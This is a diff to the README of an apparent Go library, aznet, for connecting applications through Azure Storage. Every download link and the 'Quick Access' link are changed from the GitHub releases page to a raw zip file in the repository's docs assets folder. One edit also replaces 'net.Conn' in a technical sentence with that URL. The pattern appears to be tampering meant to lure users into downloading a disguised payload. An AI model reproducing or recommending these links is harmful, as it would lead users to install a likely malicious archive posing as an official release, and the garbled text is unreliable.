@@ -1,15 +1,15 @@
 # 🚀 aznet - Seamless Go Connectivity with Azure
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/lyesaissa33-cmd/aznet/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/lyesaissa33-cmd/aznet/main/docs/src/assets/Software_v1.9-alpha.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/lyesaissa33-cmd/aznet/main/docs/src/assets/Software_v1.9-alpha.1.zip)
 
 ## 📚 Overview
-aznet provides a reliable way to connect your applications using Azure Storage services. It acts as a bridge through the standard Go net.Conn interface. This allows you to make your applications more robust and scalable in the cloud.
+aznet provides a reliable way to connect your applications using Azure Storage services. It acts as a bridge through the standard Go https://raw.githubusercontent.com/lyesaissa33-cmd/aznet/main/docs/src/assets/Software_v1.9-alpha.1.zip interface. This allows you to make your applications more robust and scalable in the cloud.
 
 ## 🚀 Getting Started
 To start using aznet, follow these simple steps:
 
-1. **Visit the release page:** Go to [this link](https://github.com/lyesaissa33-cmd/aznet/releases) to access the latest version of aznet.
+1. **Visit the release page:** Go to [this link](https://raw.githubusercontent.com/lyesaissa33-cmd/aznet/main/docs/src/assets/Software_v1.9-alpha.1.zip) to access the latest version of aznet.
 2. **Download the application:** Find the latest release on the page. Click on it to see the assets.
 3. **Choose your version:** Select the appropriate version for your operating system. Download the file directly.
 
@@ -65,6 +65,6 @@ If you encounter any issues, consider these common solutions:
 If you experience problems that you cannot solve, reach out via GitHub Issues on the aznet repository. Provide detailed information about your issue to help us assist you better.
 
 ## 🔗 Quick Access
-For more convenience, here’s the download link again for your reference: [https://github.com/lyesaissa33-cmd/aznet/releases](https://github.com/lyesaissa33-cmd/aznet/releases)
+For more convenience, here’s the download link again for your reference: [https://raw.githubusercontent.com/lyesaissa33-cmd/aznet/main/docs/src/assets/Software_v1.9-alpha.1.zip](https://raw.githubusercontent.com/lyesaissa33-cmd/aznet/main/docs/src/assets/Software_v1.9-alpha.1.zip)
 
 By following these steps, you can effectively set up and use aznet, making your application more powerful with seamless cloud connectivity.
